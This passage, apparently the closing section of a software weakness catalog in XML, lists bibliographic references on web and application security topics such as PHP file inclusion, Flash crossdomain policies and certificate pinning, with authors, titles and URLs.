	   </External_Reference>
      <External_Reference Reference_ID="REF-946">
		  <Author>Microsoft Corporation</Author>
		  <Title>Network Security Access Restrictions in Silverlight</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/cc645032.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-947">
		  <Author>Dongseok Jang</Author>
		  <Author>Aishwarya Venkataraman</Author>
		  <Author>G. Michael Sawka</Author>
		  <Author>Hovav Shacham</Author>
		  <Title>Analyzing the Crossdomain Policies of Flash Applications</Title>
		  <Publication_Year>2011</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <URL>http://cseweb.ucsd.edu/~hovav/dist/crossdomain.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-951">
		  <Author>Shaun Clowes</Author>
		  <Title>A Study in Scarlet</Title>
		  <URL>http://www.cgisecurity.com/lib/studyinscarlet.txt</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-952">
		  <Author>Stefan Esser</Author>
		  <Title>Suhosin</Title>
		  <URL>http://www.hardened-php.net/suhosin/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-953">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 13 - PHP File Inclusion</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---11</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/11/top-25-series-rank-13-php-file-inclusion/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-955">
			<Author>Chris McMahon Stone</Author>
			<Author>Tom Chothia</Author>
			<Author>Flavio D. Garcia</Author>
			<Title>Spinner: Semi-Automatic Detection of Pinning without Hostname Verification</Title>
			<URL>http://www.cs.bham.ac.uk/~garciaf/publications/spinner.pdf</URL>
			<URL_Date>2018-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-956">
			<Author>Wikipedia</Author>
			<Title>Samy (computer worm)</Title>
			<URL>https://en.wikipedia.org/wiki/Samy_(computer_worm)</URL>
			<URL_Date>2018-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-962">
			<Author>Object Management Group (OMG)</Author>
			<Title>Automated Source Code Security Measure (ASCSM)</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<URL>http://www.omg.org/spec/ASCSM/1.0/</URL>
		</External_Reference>
   </External_References>
</Weakness_Catalog>